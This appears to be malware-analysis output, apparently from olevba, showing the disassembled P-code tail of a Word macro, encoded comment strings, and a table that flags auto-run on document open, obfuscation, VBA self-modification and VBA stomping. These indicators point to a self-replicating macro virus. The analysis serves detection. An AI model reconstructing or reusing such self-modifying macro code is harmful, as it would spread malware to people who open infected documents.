' 	Concat 
' 	St bEg 
' 	QuoteRem 0x0027 0x003F "ÁÉµ»¥õô½žôºÝ¥½ææ½î¿¿øÑØ¶ýèÉç§Â»íäñÞ¯¢­Î¤þÅÎØÑ©ý£´ÈÍúªö¼ÖÙ§Ùãô¡¼"
' Line #39:
' 	Ld bEg 
' 	LitStr 0x0012 "I...Beg tO DiFFer!"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St bEg 
' 	QuoteRem 0x0028 0x0040 "ÈÇªœ¶Óêð¯¨äëïÐ»Ê´êïãíõëâþæýêÛð²¥·óÿúýðàóÿ§ÙÔ´«ôÅÊúõ÷¥½Ûé�ôèäöæÀ®"
' Line #40:
' 	Ld bEg 
' 	LitStr 0x000E "Beg TO DIFFER!"
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St bEg 
' 	QuoteRem 0x002B 0x003C "¡èòú¾ëîß£Ø¬£ÁÿüÙçÔêµ»·¶èÚÖÄõÃÐÓ¯øÃ¼Ù·±ÿ÷«�úáÜíÙ¾Ò¹ºÕÜÀêïÒ¾ÏÂ"
' Line #41:
' 	QuoteRem 0x0000 0x003C "¡èòú¾ëîß£Ø¬£ÁÿüÙçÔêµ»·¶èÚÖÄõÃÐÓ¯øÃ¼Ù·±ÿ÷«�úáÜíÙ¾Ò¹ºÕÜÀêïÒ¾ÏÂ"
' Line #42:
' 	Ld bEg 
' 	LitStr 0x0017 "jACk twoFLOWEr/lZ0/MeTA"
' 	Concat 
' 	St bEg 
' 	QuoteRem 0x0026 0x0039 "žŸºÜ ª´êÉ¤Ø÷®»ÈÒÚì»áØ´Ó¡¢¡½êÅ¨Êªì¶øõúÊ­»òô°­¶Óº³å÷ÜàÞÿÔ³ö"
' Line #43:
' 	Ld bEg 
' 	LitDI2 0x0000 
' 	LitStr 0x0013 "cLASs.BeG To diFfEr"
' 	ArgsCall MsgBox 0x0003 
' 	QuoteRem 0x0025 0x0045 "ÃÊ­ÀÙö´ÝýøäÃú³ðØÁÏ Ü¨¾ž¡ÑøÖ­ÒÙ©ÊÜ§üàÓÌÁàÙñÂ¢þø½ÎÕ¯«óßûÇ¨Æÿ°ñùªËà¶ÆÓÂ¡"
' Line #44:
' 	EndSub 
' 	QuoteRem 0x0008 0x003C "ñ§ü¥ýÕøû÷ýé£½¤¥òÏãÉéËÎï¨äØæÑïþ®­åÕ¼çä§öµ½åÃÃíÂüôÉò§ÆÚå¦ÄÖöªÃ"
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |doCUmENT_OpEN       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBcomPoNENTS        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CODEMOdULE          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddfROmstrIng       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

